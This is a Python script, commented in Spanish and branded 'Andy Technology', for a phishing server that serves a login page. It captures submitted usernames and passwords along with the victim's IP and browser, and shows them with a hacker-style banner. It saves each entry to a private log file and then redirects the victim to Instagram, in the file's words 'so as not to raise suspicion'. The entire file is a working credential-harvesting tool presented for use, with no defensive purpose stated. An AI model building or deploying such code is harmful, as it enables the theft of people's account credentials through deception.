import urllib.parse
from http.server import HTTPServer, BaseHTTPRequestHandler
from datetime import datetime
import os

# --- Configuración de Estética (Colores ANSI) ---
GREEN = "\033[38;5;46m"
RED = "\033[38;5;196m"
CYAN = "\033[38;5;51m"
YELLOW = "\033[38;5;226m"
BOLD = "\033[1m"
NC = "\033[0m" # Sin color

class AndyTechnologyServer(BaseHTTPRequestHandler):
    
    def log_message(self, format, *args):
        # Desactivar los logs aburridos del servidor por defecto
        return

    def do_GET(self):
        if self.path == '/':
            try:
                with open("index.html", "rb") as f:
                    self.send_response(200)
                    self.send_header("Content-type", "text/html")
                    self.end_headers()
                    self.wfile.write(f.read())
            except FileNotFoundError:
                self.send_error(404, "ERROR: index.html missing.")
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        # 1. Obtener longitud y leer datos
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        
        # 2. Parsear datos (aquí es donde extraemos user y pass)
        datos = urllib.parse.parse_qs(post_data)
        
        # Buscamos los nombres exactos que pusiste en tu HTML
        usuario = datos.get('user_id', ['<EMPTY>'])[0]
        password = datos.get('user_pass', ['<EMPTY>'])[0]
        
        fecha = datetime.now().strftime("%Y-%m-%d | %H:%M:%S")
        ip_cliente = self.client_address[0]
        user_agent = self.headers.get('User-Agent', 'Unknown Browser')

        # 3. EFECTO VISUAL EN TERMINAL (Lo que verás en Termux)
        print(f"\n{RED}{BOLD}[!] ALERTA: CONEXIÓN RECIBIDA [!]{NC}")
        print(f"{CYAN}--------------------------------------------------{NC}")
        print(f"{YELLOW}FECHA   :{NC} {fecha}")
        print(f"{YELLOW}IP      :{NC} {ip_cliente}")
        print(f"{YELLOW}BROWSER :{NC} {user_agent[:50]}...")
        print(f"{GREEN}{BOLD}USUARIO :{NC} {BOLD}{usuario}{NC}")
        print(f"{GREEN}{BOLD}PASS    :{NC} {BOLD}{password}{NC}")
        print(f"{CYAN}--------------------------------------------------{NC}")

        # 4. Guardar en el Log con la firma de Andy Tech
        reporte = (
            f"╔═════════════════════════════════════════════════════╗\n"
            f"  ANDY TECHNOLOGY - LOG CAPTURE\n"
            f"  Fecha: {fecha}\n"
            f"  IP   : {ip_cliente}\n"
            f"  User : {usuario}\n"
            f"  Pass : {password}\n"
            f"╚═════════════════════════════════════════════════════╝\n\n"
        )

        try:
            with open("registro_privado.txt", "a", encoding="utf-8") as f:
                f.write(reporte)
        except Exception as e:
            print(f"{RED}[-] Error escribiendo log: {e}{NC}")

        # 5. Redirigir para no levantar sospechas
        self.send_response(301)
        self.send_header('Location', 'https://www.instagram.com')
        self.end_headers()

def iniciar_servidor():
    puerto = 8080
    servidor = HTTPServer(('0.0.0.0', puerto), AndyTechnologyServer)
    
    # --- Banner de Bienvenida Estilo Hacker ---
    os.system('clear')
    print(f"""{GREEN}{BOLD}
    █████╗ ███╗   ██╗██████╗ ██╗   ██╗
    ██╔══██╗████╗  ██║██╔══██╗╚██╗ ██╔╝
    ███████║██╔██╗ ██║██║  ██║ ╚████╔╝ 
    ██╔══██║██║╚██╗██║██║  ██║  ╚██╔╝  
    ██║  ██║██║ ╚████║██████╔╝   ██║   
    ╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝    ╚═╝   
    {NC}{CYAN}      SYSTEMS & TECHNOLOGY v2.0{NC}
    {BOLD}----------------------------------------{NC}
    {YELLOW}[*]{NC} SERVIDOR : {GREEN}ONLINE{NC}
    {YELLOW}[*]{NC} PUERTO   : {GREEN}{puerto}{NC}
    {YELLOW}[*]{NC} ESTADO   : {GREEN}ESCUCHANDO PAQUETES...{NC}
    {BOLD}----------------------------------------{NC}
    """)
    
    try:
        servidor.serve_forever()
    except KeyboardInterrupt:
        print(f"\n{RED}[!] Apagando Sistemas...{NC}")
        servidor.server_close()

if __name__ == "__main__":
    iniciar_servidor()
